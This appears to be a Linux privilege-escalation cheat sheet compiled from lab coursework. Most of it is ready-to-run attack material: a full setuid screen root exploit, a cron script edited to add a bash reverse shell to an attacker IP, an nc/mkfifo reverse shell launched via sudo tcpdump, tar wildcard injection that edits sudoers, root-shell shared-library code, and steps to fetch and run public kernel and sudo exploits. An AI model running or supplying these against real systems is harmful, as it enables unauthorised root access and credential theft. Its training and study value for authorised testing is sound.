## Enumeration

<input type="checkbox" /> OS Version
<input type="checkbox" /> Kernel Version
<input type="checkbox" /> Running Services
<input type="checkbox" /> Installed Packages and Versions
<input type="checkbox" /> Logged in Users
<input type="checkbox" /> User Home Directories
	<input type="checkbox" /> `.bash_history`
	<input type="checkbox" /> SSH keys
<input type="checkbox" /> Sudo Privileges
<input type="checkbox" /> Configuration Files
<input type="checkbox" /> Readable Shadow File
<input type="checkbox" /> Password Hashes in /etc/passwd
<input type="checkbox" /> Cron Jobs
<input type="checkbox" /> Unmounted File Systems and Additional Drives
<input type="checkbox" /> SETUID and SETGID Permissions
<input type="checkbox" /> Writeable Directories
<input type="checkbox" /> Writeable Files
<input type="checkbox" /> Kernel Level and Linux OS version

#### List Current Processes
```Shell
ps aux | grep root
```

```Shell
ps au
```

#### Home Directory Contents
```Shell
ls /home
```

```Shell
ls -la /home/stacey.jenkins/
```

#### SSH Directory Contents
```Shell
ls -l ~/.ssh
```

#### Bash History
```Shell
history
```

#### Sudo - List User's Privileges
```Shell
sudo -l
```

#### Passwd
```Shell
cat /etc/passwd
```

#### Cron Jobs
```Shell
ls -la /etc/cron.daily/
```

#### File Systems & Additional Drives
```Shell
lsblk
```

#### Find Writable Directories
```Shell
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

#### Find Writable Files
```Shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
#### Find a word contained in files
```Shell
grep -rnw '/' -e 'HTB'
```
## Environment Enumeration

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
[LinEnum](https://github.com/rebootuser/LinEnum)

#### Identify OS and version
```Shell
cat /etc/os-release
```

#### Enumerate PATH directories
```Shell
echo $PATH
```

#### Enumerate environment variables
```Shell
env
```
May be able to find sensitive information, such as a password

#### Check Kernel version
```Shell
uname -a
```
May be public exploits available for specific kernel version

`OR:`

```Shell
cat /prov/version
```

#### Identify CPU version/type
```Shell
lscpu
```

#### Enumerate shells available
```Shell
cat /etc/shells
```
In the HTB Academy example, Tmux and Screen were available

#### Defenses to look for
- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
)- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

#### Enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.)
```Shell
lsblk
```
If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges

#### Enumerate printers that may be attached to the system
```Shell
lpstat
```
Active or queued print jobs may contain sensitive information

#### Check for mounted drives and unmounted drives
```Shell
cat /etc/fstab
```
Can find credentials for mounted drives by grepping common words such as 'password', 'username', 'credential'

#### Enumerate routing tables
```Shell
route
```

```Shell
netstat -rn
```

#### Check /etc/resolv.conf
```Shell
cat /etc/resolv.conf
```

#### Check arp table
```Shell
arp -a
```

#### Identify existing users and have output only show usernames
```Shell
cat /etc/passwd | cut -f1 -d:
```

#### Enumerate which users have login shells
```Shell
grep "*sh$" /etc/passwd
```
Outdated version, such as Bash version 4.1, are vulnerable to a shellshock exploit

#### Enumerate groups
```Shell
cat /etc/group
```

#### Enumerate users of any interesting groups (e.g., sudo)
```Shell
getent group sudo
```

#### Check bash history
```Shell
cat .bash_history
```
May contain interesting commands, configuration files, or credentials

#### Check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges

#### Search through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets

#### Find mounted file systems
```Shell
df -h
```

#### Unmounted file systems
```Shell
cat /etc/fstab |grep -v "#" | column -t
```
If we can extend our privileges to the root user, we could mount and read these file systems ourselves

#### Enumerate all hidden files
```Shell
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
Hidden files are common and often contain sensitive information

#### Enumerate all hidden directories
```Shell
find / -type d -name ".*" -ls 2>/dev/null
```

#### Enumerate temporary files
```Shell
ls -l /tmp /var/tmp /dev/shm
```

## Linux Services & Internals Enumeration
### Internals
#### Enumerate network interfaces
```Shell
ip a
```
#### Identify hosts
```Shell
cat /etc/hosts
```
#### Find User's Last Login
```Shell
lastlog
```
#### Find logged in users
```Shell
w
```
#### View command history
```Shell
history
```
#### Open history files
```Shell
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
#### Identify cron jobs (daily)
```Shell
ls -la /etc/cron.daily/
```
#### Viewing the proc filesystem, which contains information about system processes, hardware, and other system information
```Shell
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
### Services
#### Enumerating installed software packages
```Shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
#### List all system binaries
```Shell
ls -l /bin /usr/bin/ /usr/sbin/
```
#### Identify the sudo version
```Shell
sudo -V
```
#### Compare the existing binaries with the ones from GTFObins to see which binaries we should investigate
```Shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```
#### Tracing system calls
```Shell
strace ping -c1 10.129.112.20
```
Can be outputted to a file to allow detailed monitoring of a program's behavior
#### Find Configuration Files
```Shell
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
These configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes.
#### Enumerate bash scripts on the system
```Shell
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
#### Identifying running services by user
```Shell
ps aux | grep root
```
If a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the root directory.

## Kernel Exploits

### DirtyCow

#### Check Kernel Level and Linux OS version
```Shell
uname -a
```

```Shell
cat /etc/lsb-release
```

#### Compile the exploit code using gcc and set the executable bit using `chmod +x`
```Shell
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```

#### Run the exploit and get dropped into a root shell
```Shell
./kernel_exploit
```


## Vulnerable Services

#### Screen Version Identification
```Shell
screen -v
```

#### Privilege Escalation - Screen_Exploit.sh
```Shell
./screen_exploit.sh 
```

#### Screen_Exploit_POC.sh
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```


## Cron Job Abuse

#### Search for writeable files or directories
```Shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
In the example, a quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes

#### Examine the `/dmz/backups` directory
```Shell
ls -la /dmz-backups/
```

#### Run `pspy64` to view running processes without the need for root privileges
```Shell
./pspy64 -pf -i 1000
```
From the example provided, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory

#### Look at the shell script and append a command to it to attempt to obtain a reverse shell as root
```Shell
cat /dmz-backups/backup.sh 
```

#### Modify the script to add a Bash one-liner reverse shell
```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

#### Save the script, stand up a local netcat listener, and wait
```Shell
nc -lnvp 443
```


## Special Permissions

#### Setuid Bit
```Shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.

#### The Set-Group-ID (setgid) permission
```Shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
Allows us to run binaries as if we were part of the group that created them

### [GTFOBins](https://gtfobins.github.io/)

#### e.g., `apt-get` can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command
```Shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```


## Sudo Rights Abuse

#### Check to see if the current user has any sudo privileges
```Shell
sudo -l
```

#### Example: if the sudoers file is edited to grant a user the right to run a command such as `tcpdump`
```Shell
man tcpdump
```

#### An attacker could create the shell script `.test` containing a reverse shell
```Shell
cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

#### Start a netcat listener on our attacking box run tcpdump as root with the postrotate-command
```Shell
nc -lnvp 443
```

#### Using `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands
```Shell
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
Leveraged by specifying the `-z` flag


## Path Abuse

#### Check the contents of the `PATH` variable
```Shell
echo $PATH
```
`OR`:
```Shell
env | grep PATH
```
Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

#### Determine directory of a script or program (e.g., `conncheck`)
```Shell
pwd && conncheck 

/usr/local/sbin
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2  
```
The conncheck script that was created in `/usr/local/sbin` will still run when the user is in the `/tmp` directory because it was created in a directory specified in the PATH

#### If we can modify a user's path, we could replace a common binary such as `ls `with a malicious script such as a reverse shell
```Shell
echo $PATH
```

#### Add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`
```Shell
PATH=.:${PATH}
export PATH
echo $PATH
```
This will allow us to run binaries located in our current working directory by just typing the name of the file

#### Modify the path to run a simple echo command when the command `ls` is typed
```Shell
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

#### Run the script by typing the `ls` command
```Shell
ls

PATH ABUSE!!
```


## Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

| **Character** | **Significance**                                                                                                                                      |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`           | An asterisk that can match any number of characters in a file name                                                                                    |
| `?`           | Matches a single character.                                                                                                                           |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| `-`              | A hyphen within brackets will denote a range of characters.                                                                                                                                                      |

#### Example: `tar` command - Look at the man page
```Shell
man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```
The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options

#### Example: a cron job, which is set up to back up the `/root` directory's contents and create a compressed archive in `/tmp`
```txt
#
#
mh dom mon dow command
*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *
```

#### Leverage the wild card in the cron job to write out the necessary commands as file names
```Shell
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

#### Check and see that the necessary files were created
```Shell
ls -la
```

#### Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly
```Shell
sudo -l
```

## Escaping Restricted Shells
#### Common restricted shells
<input type="checkbox" />Restricted Bourne Shell (rbash)
<input type="checkbox" />Restricted Korn Shell (rksh)
<input type="checkbox" />Restricted Z Shell (rzsh)
### Escape methods
#### Escape through command injection
```Shell
ls -l `pwd`
```
Injects a `pwd` command into the argument of the `ls` command. This would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly.
#### Escape through command substitution
#### Escape through command chaining
- Use commands such as (`;`) or (`|`)
- E.g., if the environment variable specifies a directory where commands are executed, you can change the environment variable to specify a different directory
```Shell
echo $PATH
```
#### Shell functions
#### Escaping from the outside
```Shell
ssh htb-user@10.129.205.109 -t "bash --noprofile"
```
### rbash
#### Identify commands that can be executed
```Shell
compgen -c
```
## Credential Hunting

#### Searching for MySQL database credentials within WordPress configuration files
```Shell
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

#### Searching in config files
```Shell
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

#### Searching for SSH keys
```Shell
ls ~/.ssh
```


## Shared Libraries

#### View the shared objects required by a binary
```Shell
ldd /bin/ls
```
![[Pasted image 20230310114608.png]]
The image above lists all the libraries required by `/bin/ls`, along with their absolute paths

### LD_PRELOAD Privilege Escalation
*For this, we need a user with sudo privileges.*

#### Check for sudo privs
```Shell
sudo -l
```

#### Exploit the LD_PRELOAD issue to run a custom shared library file, written in C as follows:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

#### Compile the binary
```Shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

#### Use sudo with LD_PRELOAD command to escalate privileges
```Shell
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
Make sure to specify the full path to your malicious library file


## Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them.

##### Example: `payroll`
```Shell
ls -la payroll
```

#### Use `ldd` to print the shared object required by a binary or shared object
```Shell
ldd payroll
```
![[Pasted image 20230310115752.png]]
We see a non-standard library named `libshared.so` listed as a dependency for the binary. It is possible to load shared libraries from custom locations.

#### Use readelf utility to determine if the `RUNPATH` configuration is set for the binary's library
```Shell
readelf -d payroll  | grep PATH
```
The configuration allows the loading of libraries from the `/development` folder, which is writable by all users.

This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files)

```Shell
ls -la /development/
```

#### Find the function name called by the binary
```Shell
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```Shell
ldd payroll
```
![[Pasted image 20230310115830.png]]
Running `ldd` against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable.

```Shell
./payroll
```
![[Pasted image 20230310115909.png]]
Executing the binary throws an error stating that it failed to find the function named `dbquery`

#### Copy an existing library to the development folder
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called

#### Compile the binary
```Shell
gcc src.c -fPIC -shared -o /development/libshared.so
```

#### Execute the binary to obtain a root shell
```Shell
./payroll 
```
![[Pasted image 20230310120237.png]]


## Privileged Groups

### LXC / LXD
Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`

#### Enumerate Group Memberships
```Shell
id
```

#### Unzip the Alpine image
```Shell
unzip alpine.zip
```

#### Start the LXD initialization process
```Shell
lxd init
```

#### Choose the defaults for each prompt
![[Pasted image 20230310120533.png]]
[More information on setting up and using LXD on Ubuntu 16.04](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)

#### Import the local image
```Shell
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

#### Start a privileged container with the `security.privileged` set to `true `to run the container without a UID mapping
```Shell
lxc init alpine r00t -c security.privileged=true
```
This makes the root user in the container the same as the root user on the host

#### Mount the host file system
```Shell
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

#### Spawn a shell inside the container instance
```Shell
lxc start r00t
```

```Shell
lxc exec r00t /bin/sh
```

## Capabilities


### Docker
- Members of the docker group can spawn new docker containers
- Example: 
	- Running the command `docker run -v /root:/mnt -it ubuntu`
	- Creates a new Docker instance with the `/root` directory on the host file system mounted as a volume
	- Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user
- This example could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

### Disk
- Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`
- An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges
- As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user

### ADM
- Members of the adm group are able to read all logs stored in `/var/log`


## Miscellaneous Techniques

### Passive Traffic Capture
- `tcpdump`
- [`net-creds`](https://raw.githubusercontent.com/DanMcInerney/net-creds/master/net-creds.py)
- [`PCredz`](https://github.com/lgandx/PCredz)

### Weak NFS Privileges

#### List the NFS server's export list (or the access control list for filesystems) that NFS clients
```Shell
showmount -e 10.129.2.12
```

#### Create a binary in C
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

#### Compile the binary
```Shell
gcc shell.c -o shell
```

#### Mount the directory
```Shell
mount -t nfs 10.129.2.12:/tmp /mnt
```

```Shell
cp shell /mnt
```

```Shell
chmod u+s /mnt/shell
```

#### When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell
```Shell
ls
```
Ensure binary is in the `/tmp` folder

```Shell
./shell
```

### Hijacking Tmux Sessions
A user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked

#### Create a new shared session and modify the ownership
```Shell
tmux -S /shareds new -s debugsess
```

```Shell
chown root:devs /shareds
```

#### Check for any running tmux processes
```Shell
ps aux | grep tmux
```

#### Confirm permissions
```Shell
ls -la /shareds
```

#### Review our group membership
```Shell
id
```

#### Attach to the tmux session and confirm root privileges
```Shell
tmux -S /shareds
```

```Shell
id
```

## Recent Zero Days
### Sudo
#### Sudo version 1.8.31
##### Check version
```Shell
sudo -V | head -n1
```
##### Clone exploit from GitHub and compile
```Shell
git clone https://github.com/blasty/CVE-2021-3156.git
```

```Shell
cd CVE-2021-3156
```

```Shell
make
```
##### Run exploit on host
```Shell
./sudo-hax-me-a-sandwich
```
Will require specifying target OS
##### Find out OS version (required for exploit)
```Shell
cat /etc/lsb-release
```
##### Run exploit on host (with target option identified)
```Shell
./sudo-hax-me-a-sandwich 1
```
#### Sudo version 1.8.28
##### See what commands can be executed w/ sudo
```Shell
sudo -l
```
##### Execute sudo w/ the binary that can be executed
```Shell
sudo -u#-1 id
```
#### Sudo version 1.8.27/1.8.21p2
##### Identify which sudo command can be executed
```Shell
sudo -l
```
(e.g., ncdu)
##### Execute the command w/ sudo
```Shell
sudo -u#-1 ncdu
b
```
### Polkit
#### Using pkexec to run commands as another user
```Shell
pkexec -u <user> <command>
```

```Shell
pkexec -u root id
```
#### [Pwnkit (CVE-2021-4034)](https://github.com/arthepsy/CVE-2021-4034)
##### Clone and compile exploit
```Shell
git clone https://github.com/arthepsy/CVE-2021-4034.git
```

```Shell
cd CVE-2021-4034
```

```Shell
gcc cve-2021-4034-poc.c -o poc
```
##### Execute the exploit
```Shell
./poc
```
### [Dirty Pipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
#### Download and compile the exploit
```Shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

```Shell
cd CVE-2022-0847-DirtyPipe-Exploits
```

```Shell
bash compile.sh
```
#### Option A: modifying /etc/passwd
##### Verify kernel version
```Shell
uname -r
```
Example: 5.13.0-46-generic
##### Exploitation
```Shell
./exploit-1
```
#### Option B: Executing SUID binaries w/ root privileges
##### Find SUID binaries on host
```Shell
find / -perm -4000 2>/dev/null
```
##### Exploitation
```Shell
./exploit-2 /usr/bin/sudo
```
### Netfilter
- [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555): Vulnerable kernel versions: 2.6 - 5.11
- [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015): Vulnerable kernel versions: 5.4 through 5.6.10
- [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233): Vulnerable kernel versions: <= 6.3.1 - nf_tables
#### CVE-2021-22555
```Shell
uname -r
```

```Shell
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

```Shell
gcc -m32 -static exploit.c -o exploit
```

```Shell
./exploit
```
#### CVE-2022-25636
```Shell
git clone https://github.com/Bonfee/CVE-2022-25636.git
```

```Shell
cd CVE-2022-25636
```

```Shell
make
```

```Shell
./exploit
```
#### CVE-2023-32233
```Shell
git clone https://github.com/Liuk3r/CVE-2023-32233
```

```Shell
cd CVE-2023-32233
```

```Shell
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

```Shell
./exploit
```
